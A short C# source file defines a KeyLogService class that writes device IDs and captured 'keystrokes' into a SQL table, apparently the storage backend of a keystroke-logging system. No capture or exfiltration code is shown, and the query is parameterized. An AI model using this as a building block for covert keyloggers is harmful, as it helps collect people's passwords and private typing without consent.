using System;
using System.Collections.Generic;
using System.Data.SqlClient;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace facadefinal
{
    public class KeyLogService
    {
        private readonly string _connectionString;

        public KeyLogService(string connectionString) => _connectionString = connectionString;

        public void InsertKeyLogs(Guid uuid, string keystrokes)
        {
            using (var conn = new SqlConnection(_connectionString))
            {
                conn.Open();
                var cmd = new SqlCommand("INSERT INTO Keyss (DeviceID, TypedText) VALUES (@uuid, @keystrokes)", conn);
                cmd.Parameters.AddWithValue("@uuid", uuid);
                cmd.Parameters.AddWithValue("@keystrokes", keystrokes);
                cmd.ExecuteNonQuery();
            }
        }
    }

}
